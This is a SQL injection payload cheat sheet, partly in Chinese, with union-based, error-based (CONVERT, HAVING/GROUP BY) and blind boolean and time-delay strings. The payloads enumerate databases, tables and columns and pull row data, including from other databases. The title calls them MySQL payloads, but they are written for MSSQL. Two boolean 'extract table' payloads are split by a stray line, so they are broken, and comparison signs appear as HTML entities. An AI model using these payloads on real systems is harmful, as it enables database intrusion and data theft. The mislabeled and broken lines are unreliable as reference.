下面是MySQL实用注入payloads，将按类别列出：基于联合、基于错误和推理（时间和布尔值）。
无论您在哪里看到下面的@@version（用于查找数据库版本），您都可以将其替换为：

**db_name()**  提取库名  
user_name（） or user（） 提取数据库运行时的用户名  
@@servername 提取服务器名称  
**host_name()**  提取主机名
## UNION 联合查询

[UNION](http://technet.microsoft.com/en-us/library/ms180026.aspx)用于将我们的恶意查询附加到Web应用程序发出的有效查询的末尾。请记住首先使用具有NULL值的[ORDER BY](http://technet.microsoft.com/en-us/library/ms188385.aspx)或[UNION](http://technet.microsoft.com/en-us/library/ms180026.aspx)查找列数。假设有三列：

提取数据库版本：
```SQL
1 UNION SELECT NULL,@@version,NULL--
```
提取数据库名称（将N更改为从1开始的数字）：
```sql
1 UNION SELECT NULL,DB_NAME(N),NULL--
1 UNION SELECT NULL,name,NULL FROM master ..sysdatabases--
```
提取表名：
```sql
1 UNION SELECT NULL,TABLE_NAME,NULL FROM information_schema.TABLES--
1 UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype = 'U'--
```
提取列名（替换table1）：
```sql
1 UNION SELECT NULL,column_name,NULL FROM information_schema.COLUMNS-- will extract all columns (regardless of table)

1 UNION SELECT TABLE_NAME,column_name,NULL FROM information_schema.COLUMNS-- will line up tables with columns

1 UNION SELECT NULL,name,NULL FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'table1')-- will extract columns from a specific table in the current database
```
提取数据（更改列1和表1）：
```sql
1 UNION SELECT NULL,column1,NULL FROM table1--
```

Extract table names from another database (replace other_database with database name)

```sql
1 UNION SELECT NULL,name,NULL FROM other_database..sysobjects WHERE xtype = 'U'--
```

Extract column names from another database (replace other_database and other_table):

```sql
1 UNION SELECT other_database..syscolumns.name, TYPE_NAME(other_database..syscolumns.xtype),NULL FROM other_database..syscolumns, other_database..sysobjects WHERE other_database..syscolumns.id=other_database..sysobjects.id AND other_database..sysobjects.name='other_table'--
```

Extract data from another database (replace other_database, other_table and other_column):

```sql
1 UNION SELECT NULL,other_column,NULL FROM other_database..other_table--
```

## Error Based 基于错误

CONVERT

这种技术与基于MySQL双查询错误的注入（在[[…/MySQL/MySQL实用注入备忘单0]]中讨论）非常相似，因为错误是强制的；但是，包含一个有效的MSSQL查询，该查询首先被执行，导致查询结果显示在错误消息中。在下面的示例中，如果直接输入地址栏，请务必使用%2b编码+。执行这种攻击有两种方法，下面列出的第一种最快。

### Method 1 – Quicker 

Extract database version:

```sql
1 AND 1=CONVERT(INT,@@version)--
```

Extract number of databases:

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--
```

Extract database names (replace N with a number starting from 1):

```sql
1 AND 1=CONVERT(INT,db_name(N))--

1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=N))--
```

Extract table count:

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--
```

Extract table names (replace N with a number starting from 1):

```sql
1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--
```

To extract column names (replace table1 with appropriate table name):

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--
```

To extract data, first count the entries in the table (replace table1 with appropriate table name):

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM table1)+CHAR(58)+CHAR(58)))--
```

Then, assuming the columns we wish to extract from are called column1 and column2:

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 1 column1 , column2 FROM table1 ORDER BY column1  ASC) sq ORDER BY column1  DESC)+CHAR(58)+CHAR(58)))--
```

The second top 1 should be incremented to extract subsequent rows:

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 2 column1, column2 FROM table1 ORDER BY column1 ASC) sq ORDER BY column1 DESC)+CHAR(58)+CHAR(58)))--
```

Extract tables from another database (change other_database and increase N):

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM other_database.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--
```

Extract columns from another database (change other_database, other_table and increase N):

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='other_table' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--
```

See how many data entries there are in another database (change other_database and other_table):

 ```sql
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [other_database]..[other_table] )+CHAR(58)+CHAR(58)))--
```

Extract data from another database (change other_database, other_table, other_column and increase N):

```sql
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 other_column FROM (SELECT top N other_column FROM other_database..other_table ORDER BY other_column ASC) sq ORDER BY other_column DESC)+CHAR(58)+CHAR(58)))--
```

### Method 2 – Slower

Extract database names (replace N with a number starting from 1):

```sql
1 AND 1=CONVERT(INT,db_name(N))--
```

Extract first table name:

```sql
1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES))--
```

As this had extracted the first table’s name (table1 in the example below), we add that to the query to enumerate the next table, like so:

```sql
1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN ('table1')))--
```

Further tables can then be enumerated by adding table names to the query. The following query would extract the third table name:

```sql
1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN ('table1', 'table2')))--
```

Columns are then enumerated in the same manner as before (replace table1):

```sql
1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'))--

1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name NOT IN ('column1')))--

1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name NOT IN ('column1', 'column2')))--
```

Extract data (replace column1 and table1):

```sql
1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1))--

1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1 WHERE column1 NOT IN ('result1')))--

1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1 WHERE column1 NOT IN ('result1', 'result2')))--
```

HAVING and GROUP BY

Some basic enumeration of the current database can be performed by forcing errors through the use of[HAVING](http://www.w3schools.com/sql/sql_having.asp) and [GROUP BY](http://www.w3schools.com/sql/sql_groupby.asp).

```sql
1 HAVING 1=1--
```

Will reveal the current table and the first column name in a table_name.column_name format.

The second column name can be enumerated with:

```sql
1 GROUP BY table1.column1 HAVING 1=1--
```

The second column name can then be added to the query to reveal the third column name:

```sql
1 GROUP BY table1.column1, table1.column2 HAVING 1=1--
```

If the page no longer errors when adding columns, there are none left to enumerate.

## Inferential

When no data or error messages are returned, inferential injections (aka blind injections) can be used to ‘infer’ database information by using time based or boolean responses. This is done by using the [SUBSTRING](http://technet.microsoft.com/en-us/library/ms187748.aspx) function to break up query results into individual characters which can be enumerated separately. The characters are entered using the [ASCII](http://technet.microsoft.com/en-us/library/ms177545.aspx) function via their decimal codes, which can be ascertained by using this [ASCII chart](http://www.flprisktran.wpengine.com/blog/wp-content/uploads/2013/03/ascii_table.jpg). The [LOWER](http://technet.microsoft.com/en-us/library/ms174400.aspx) function is also used to ensure we only have to deal with lower case characters (up until the point of actual data retrieval).

In the case of time delay injections, thus, we are effectively asking the database: “if the first character of the database user’s name is S, wait 10 seconds before returning the page”. If the first character is not S, the page will return immediately. In the case of boolean injections, the expected page will return if the query evaluates to true and a differing page will return if the query evaluates to false.

When making inferential injections, it’s often useful to determine how many characters are in the piece of data you’re trying to extract. In MSSQL, this can be achieved by wrapping the injection in [LEN](http://technet.microsoft.com/en-us/library/ms190329.aspx) .

### Boolean 

Extract version length:

```sql
1 AND LEN(@@version)&gt;5--
```

Extract first character of version:

```sql
1 AND ASCII(LOWER(SUBSTRING((@@version),1,1)))&gt;97--
```

By increasing the SUBSTRING start argument, you can extract the second character in the version, like so:

```sql
1 AND ASCII(LOWER(SUBSTRING((@@version),2,1)))&gt;97--
```

Extract databases (replace N):

```sql
1 AND LEN(DB_NAME())&gt;5--

1 AND ASCII(LOWER(SUBSTRING((DB_NAME(N)),1,1)))&gt;97--
```

Extract 1st table:

```sql
1 AND LEN((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'))&gt;5--

1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'),1,1)))&gt;97--
```

Extract 2nd table (replace table1 with the first table’s name):

```sql
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'
1 AND name &gt;'table1'),1,1)))&gt;97--
```

Extract 3rd table (replace table2 with the second table’s name):

```sql
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'
1 AND name&gt;'table2'),1,1)))&gt;97--
```

Extract 1st column (replace table1):

```sql
1 AND LEN((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'))&gt;5--

1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'),1,1)))&gt;97--
```

Extract 2nd column (replace table1 and column1):

```sql
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name &gt;'column1'),1,1)))&gt;97--
```

Extract 1st field of column1 (replace column1 and table1):

```sql
1 AND LEN((SELECT TOP 1 column1 FROM table1))&gt;5--

1 AND ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1),1,1))&gt;65--
```

Extract 1st field of column2 (replace column1 and table1):

```sql
1 AND LEN((SELECT TOP 1 column2 FROM table1))&gt;5--

1 AND ASCII(SUBSTRING((SELECT TOP 1 column2 FROM table1),1,1))&gt;65--
```

Extract 2nd field of column1 (replace column1,table1 and field1):

```sql
1 AND ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1 WHERE column1 &gt;'field1'),1,1))&gt;65--
```

Extract table 1 from another database (replace other_database)

```sql
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM other_database..sysobjects WHERE xtype='U'),1,1)))&gt;97--
```

Extract 1st column from another database (replace other_database and other_table):

```sql
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='other_table'),1,1)))&gt;97--
```

Extract data from another database (replace other_database, other_table and other_column):

```sql
1 AND ASCII(SUBSTRING((SELECT TOP 1 other_column FROM other_database..other_table),1,1))&gt;65--
```

### Time  
Time based MSSQL injections use the [WAITFOR](http://technet.microsoft.com/en-us/library/ms187331.aspx) function to produce an attacker specified delay in page loading if the query given evaluates to true.  
Extract version:

```sql
1; IF LEN(@@version)&gt;5 WAITFOR DELAY '00:00:15'--

1; IF ASCII(LOWER(SUBSTRING((@@version),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

Extract DB Name (replace N):

```sql
1; IF(LEN(DB_NAME())&gt;5 WAITFOR DELAY '00:00:15'--

1; IF ASCII(LOWER(SUBSTRING((DB_NAME(N)),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

Extract 1st table:

```sql
1; IF (LEN((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'))&gt;5) WAITFOR DELAY '00:00:15'--

1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

Extract 2nd table (replace table1):

```sql
1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name&gt;'table1'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

Extract 3rd table (replace table2):

```sql
1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name&gt;'table2'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

To extract 1st column (replace table1):

```sql
1; IF LEN((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'))&gt;5 WAITFOR DELAY '00:00:15'--

1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

To extract 2nd column (replace table1 and column1):

```sql
1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'  AND column_name &gt;'column1' ),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

Extract 1st field of column 1 (replace table1 and column1):

```sql
1; IF LEN((SELECT TOP 1 column1 FROM table1))&gt;5 WAITFOR DELAY '00:00:15'--

1; IF ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1),1,1))&gt;65 WAITFOR DELAY '00:00:15'--
```

Extract 1st field of column 2 (replace table1 and column1):

```sql
1; IF LEN((SELECT TOP 1 column2 FROM table1))=3 WAITFOR DELAY '00:00:15'--

1; IF ASCII(SUBSTRING((SELECT TOP 1 column2 FROM table1),1,1))&gt;65 WAITFOR DELAY '00:00:15'--
```

Extract 2nd field of column 1 (replace column1,table1 and field1):

```sql
1; IF ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1 WHERE column1 &gt;'field1'),1,1))&gt;65 WAITFOR DELAY '00:00:15'--
```

Extract 1st table from another database (replace other_database):

```sql
1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM other_database..sysobjects WHERE xtype='U'),1,1)))=117 WAITFOR DELAY '00:00:15'--
```

Extract 1st column from another database (replace other_database and other_table):

```sql
1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='table1'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
```

Extract 1st field of column 1 from another database (replace other_database, other_table and other_column):

```sql
1; IF (ASCII(SUBSTRING((SELECT TOP 1 other_column FROM other_database..other_table),1,1))&gt;65) WAITFOR DELAY '00:00:15'--
```

## Sources Used

The above information was took from a variety of sources, including:  
**[Kaotic Creation’s article on blind SQL injections](http://kaoticcreations.blogspot.co.uk/p/blind-time-based-sql-injections.html)**  
**[Kaotic Creation’s article on CONVERT error based injections](http://kaoticcreations.blogspot.co.uk/2011/10/microsoft-sql-server-mssql-and-sql.html)**  
**[Pentest Monkey’s MSSQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)**  
**[CWH Underground’s ‘Full MSSQL Injection PWNage’ paper](http://www.exploit-db.com/papers/12975/)**

Some other resources I recommend are:  
[Acuforum](http://testasp.vulnweb.com/) – an online vulnerable web app hosted by Acunetix  
[SQLZoo](http://sqlzoo.net/wiki/Main_Page) – a great online test bed